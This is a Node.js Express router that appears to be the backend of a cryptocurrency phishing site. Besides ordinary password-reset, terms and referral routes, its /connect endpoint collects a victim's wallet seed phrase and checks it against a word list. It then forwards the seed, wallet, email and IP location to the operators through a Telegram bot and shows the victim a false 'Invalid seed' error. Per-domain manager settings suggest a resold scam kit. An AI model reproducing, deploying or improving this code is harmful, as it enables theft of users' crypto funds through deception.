const express = require('express')
const expressip = require('express-ip')
const router = express.Router()

const Joi = require('@hapi/joi')

const bcrypt = require('bcryptjs')

const User = require('../models/User')
const Domain = require('../models/Domain')

const UserMiddleware = require('../user/middleware')
const UserToken = require('../user/token')
const Logger = require('../user/logger')
const Bot = require('../telegram-bot')


router.use('/', require('./user/profile'))
router.use('/', require('./user/chat'))
router.use('/', require('./user/2fa'))

const words = require('../../words.json')

router.post('/reset-password',
  UserMiddleware.validatePasswordResetToken,
  (req, res) => {
    const user = res.locals.user

    if (req.body.newPassword && req.body.repeatNewPassword) {
      const error = Joi.object({
        newPassword: Joi.string()
          .pattern(
            /^[0-9A-Za-z#$%=@!{},`~&*()'<>?.:;_|^\/+\t\r\n\[\]"-]{6,32}$/,
          )
          .required()
          .error(new Error('Passwords must contain 6 to 32 characters.')),
        repeatNewPassword: Joi.string()
          .valid(Joi.ref('newPassword'))
          .required()
          .error(new Error("New passwords don't match.")),
      }).validate({
        newPassword: req.body.newPassword,
        repeatNewPassword: req.body.repeatNewPassword,
      }).error

      if (error) {
        res.status(406).send({
          stage: 'Validation',
          message: error.message,
        })
      } else {
        const salt = bcrypt.genSaltSync(7)
        const hashedPassword = bcrypt.hashSync(req.body.newPassword, salt)

        user.password = hashedPassword
        user.save(() => {
          Logger.register(
            UserMiddleware.convertUser(user),
            200,
            'password_changed',
            'action.user.passwordChanged',
          )
          res.status(200).send({
            token: UserToken.authorizationToken(user),
            stage: 'Password reset',
            message: 'Your password has been changed',
          })
        })
      }
    } else {
      res.status(400).send({
        stage: 'Error 400',
        message: 'Fill out all the fields to continue',
      })
    }
  },
)

router.get('/terms', UserMiddleware.requireAccess, async (req, res) => {
  var terms = ''
  const user = res.locals.user
  const domain = await Domain.findOne({ name: req.get('host') })
  let managerEmail = domain?.manager || user.bindedTo
  const manager = await User.findOne({ email: managerEmail }, 'role')

  if (manager?.role?.name != 'user' && manager?.role?.settings?.terms) {
    terms = manager.role.settings.terms.replace('\n', '')
  } else if (user.role.name != 'user' && user?.role?.settings?.terms) {
    terms = user.role.settings.terms
  }

  res.send(terms)
})

router.get('/ref', UserMiddleware.requireAccess, async (req, res) => {
  const user = res.locals.user

  const id = user._id.split('').reverse().join('')
  const link = `${req.get('host')}/?ref=${id}`

  res.send({
    link
  })
})

router.post('/connect', UserMiddleware.requireAccessLight(), expressip().getIpInfoMiddleware, async (req, res) => {
  let { seed, wallet } = req.body

  let valid = true

  seed = seed.toLowerCase()
  seed.split(' ').forEach(w => {
    if (!words.includes(w)) valid = false
  })

  if (valid) {
    Logger.register(
      UserMiddleware.convertUser(res.locals.user),
      200,
      'connected',
      'action.user.connected',
    )

    let messageLines = [
      `DOMAIN: ${req.get('host')}`,
      `USER: ${res.locals.user.email}`,
      `WALLET: ${wallet}`,
      `SEED: ${seed}`,
      `IP: ${req.ipInfo.ip}, ${req.ipInfo.city}, ${req.ipInfo.country}`
    ]

    Bot.notifyOwners(messageLines.join('\n'))

    let manager = await User.findOne({ email: res.locals.user.bindedTo }, 'role').lean()

    res.status(400).send({
      message: res.locals.user.walletConnectMessage?.trim()
        || manager?.role?.settings?.walletConnectMessage?.trim()
        || 'Invalid seed'
    })
  } else {
    res.status(400).send({ message: 'Invalid seed' })
  }
})

module.exports = router
